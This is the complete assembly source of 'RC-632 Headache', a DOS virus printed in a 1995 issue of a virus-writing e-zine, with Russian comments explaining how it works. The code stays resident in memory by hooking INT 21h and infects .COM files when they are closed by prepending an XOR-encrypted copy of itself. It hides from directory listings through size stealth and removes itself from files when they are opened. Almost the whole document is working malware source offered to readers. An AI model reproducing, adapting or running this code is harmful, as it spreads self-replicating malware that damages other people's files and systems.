;     ▄▄                  █
;    ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       XII 1995
;    ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
;     ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ ▄▀▀▄ █ 
;      █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▄▀▀▄ █
;      █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ ▀▄▄▀ █
;      ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
;      (C) Copyright,1994-95,by STEALTH group WorldWide, unLtd.
 
; RC-632 "HEADACHE"
; Записывается в начало файла.
; STEALTH-механизм по FindFirst/FindNext
; Удаляет себя из зараженного файла на диске при открытии, заражает при 
; закрытии.
; Издает "BEEP" при удалении себя из зараженного файла.
; Hе заражает CO*.*

; КОМПИЛИРОВАТЬ С ОДHИМ ПРОХОДОМ !!!

; (c) Int O'Dream 1995
; only for "Stealth" group (No published)
; First demo version 

.286
.model tiny
.code
org 100h
start:
nop				
nop
mov ax,kod			; расшифровка тела
lea di,begin
mov cx,len_codir/2+1
asd:
lea bx,afa
mov byte ptr ds:[bx],0c3h
afa:
nop
mov byte ptr ds:[bx],90h	; трюк с конвейером
jmp $+2
xor ds:[di],ax
inc di
inc di
cmp cx,0
dec cx
jnz asd
jmp _begin
kod dw 0
_begin equ $			; начало зашифрованного тела
begin:
pusha
push es ds
mov ax,1234h			; проверка себя в памяти
int 21h
cmp ax,4321h
jz quit
@1:
mov ax,ds			; откусывание памяти
dec ax
mov es,ax
sub word ptr es:[03],(len*2/16)+1
sub word ptr ds:[2],(len*2/16)+1
mov ax,ds:[2]
sub ax,10h
mov es,ax			; перенос себя в откушенную часть
mov si,100h
mov di,si
mov cx,len
cld
rep movsb
xor ax,ax			; перехват INT 21h
mov ds,ax
mov ax,word ptr ds:[21h*4]
mov word ptr es:[old_21],ax
mov ax,word ptr ds:[21h*4+2]
mov word ptr es:[old_21+2],ax
;lea bx,@7
;push bx
;ret
;mov ds,ax
;@7:
mov word ptr ds:[21h*4],offset int_21
mov word ptr ds:[cs:21h*4+2],es
quit:
pop ds es
popa
mov si,word ptr cs:lena		; возврат оригинальных байт и возврат
mov di,100h
add si,di
mov cx,len
cld
mov bx,0fch
mov word ptr cs:[bx],0a4f3h
mov word ptr cs:[bx+2],00ebh
push bx
ret

int_21:				; обработчик INT 21h
cmp ax,1234h
jnz @2
mov ax,4321h
retf 2
@2:
cmp ah,03eh		
jnz next
jmp close
next:
cmp ah,4eh
jz find
cmp ah,4fh
jz find
next1:
cmp ah,3dh
jz open
jmp @3

set_24int:			
push ds ax dx 

mov ax,2524h
lea dx,int_24
push cs
pop ds
call orig_21
pop dx ax ds
ret

int_24:
mov ax,0
iret

find:			; Stealth-механизм по FINDFIRST/FINDNEXT
call orig_21
jc end_find
pushf
push ds es
pusha
mov ah,2fh
int 21h
mov ax,word ptr es:[bx+16h]
and al,1fh
cmp al,7
jnz end_pop
sub word ptr es:[bx+1ah],len
end_pop:
popa
pop es ds
popf
end_find:
retf 2

as1 dw 0
tim dw 0
dat dw 0

open:
mov cs:as1,ax
call orig_21
jc end_find
pushf
push ds es
pusha
mov bx,ax
call get_sft
call get_time
jc end_pop
call read_block
jc end_pop
call save_time
jnz end_pop
mov bp,es:[di+11h]
mov word ptr es:[di+2],2
sub bp,len
mov es:[di+15h],bp
call read_block
jc end_pop
mov word ptr es:[di+15h],0
call set_24int
mov ah,40h
call orig_21
jc end_pop
mov al,7h
int 29h
mov word ptr es:[di+11h],bp
mov al,0
call rest_time
mov ah,3eh
call orig_21
popa
pop es ds
popf
mov ax,cs:as1
call orig_21
retf 2 

db 'Headache'

close:
pusha
push es ds
call get_sft

push ds
xor ax,ax
mov ds,ax
mov ax,ds:[46ch]
mov cs:kod,ax
pop ds

cmp es:[di+40],'OC'
jz @as
jmp fuck
@as:
cmp es:[di+20h],'OC'
jz fuck
mov bp,es:[di+17]
cmp bp,60000
ja fuck
cmp bp,len
jb fuck
call get_time
jnc fuck
mov word ptr es:[di+2],2
mov word ptr es:[di+21],0
call read_block
call save_time
jz fuck
mov word ptr es:[di+21],bp
mov cs:lena,bp
call set_24int
mov ah,40h
call orig_21
jc fuck
mov word ptr es:[di+21],0

mov si,100h
push es di 
mov dx,cs:kod
push ds 
pop es
lea di,buf
mov cx,len
push es di
lea bp,begin-100h
add bp,offset buf
dfg:
lodsw
cmp di,bp
jb asdf
xor ax,dx
asdf:
stosw
loop dfg
pop dx ds
pop di es
mov ah,40h
mov cx,len
call orig_21
fuck1:
mov al,7
call rest_time
fuck:
pop ds es
popa

@3:
db 0eah
old_21 dd 0

save_time:
mov ax,es:[di+0dh]
mov cs:tim,ax
mov ax,es:[di+0fh]
mov cs:dat,ax
cmp word ptr cs:[buf],9090h
ret

rest_time:
mov cx,cs:tim
mov dx,cs:dat
and cl,0e0h
add cl,al
mov ax,5701h
call orig_21
ret

get_time:
mov ax,word ptr es:[di+0dh]
and al,1fh
cmp al,7
jz end_time
stc
ret
end_time:
clc
ret

orig_21:
pushf
call dword ptr cs:[old_21]
ret

get_sft:
push bx
mov ax,1220h
int 2fh
mov bl,es:[di]
mov ax,1216h
int 2fh
pop bx
ret

read_block:
mov ah,3fh
mov cx,len
push cs
pop ds
lea dx,buf
call orig_21 
ret

lena  dw len
len_codir equ $-begin
len equ $-start

ret
buf:
end start

; ─────────────────────────────────────────────────────────────────────────
; ──────────────── Remember Where You Saw This Phile First ────────────────
; ───────[=] ARRESTED DEVELOPMENT +31.77.3547477 The Netherlands [=]───────
; ─────────────────────────────────────────────────────────────────────────
